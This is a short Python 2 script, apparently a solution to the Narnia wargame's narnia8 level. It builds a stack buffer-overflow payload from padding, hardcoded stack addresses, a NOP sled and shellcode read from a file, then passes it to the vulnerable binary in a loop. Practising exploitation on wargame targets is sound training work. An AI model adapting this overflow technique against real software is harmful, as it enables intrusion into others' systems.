import sys
import subprocess

for i in range(1, 256):
    culstr = ""

    culstr += 'A' * 20
    #culstr += chr(i)
    culstr += '\x0f\xd8\xff\xff'
#    culstr += '\xf8\xd7\xff\xff'
    culstr += 'ABCDEFGHIJKL'

    #culstr +=  chr(i)
    culstr += '\x4d\xd6\xff\xff'
    culstr += '\x90' * 80
    with open('inject1', 'r') as fin:
        culstr +=fin.read()

    #sys.stdout.write()
    print i, len(culstr)
    subprocess.call(['/narnia/narnia8',culstr[:]])
    #print culstr[37:40]


# need to overwrite 0x080484cd, the return -> throw onto nop slide
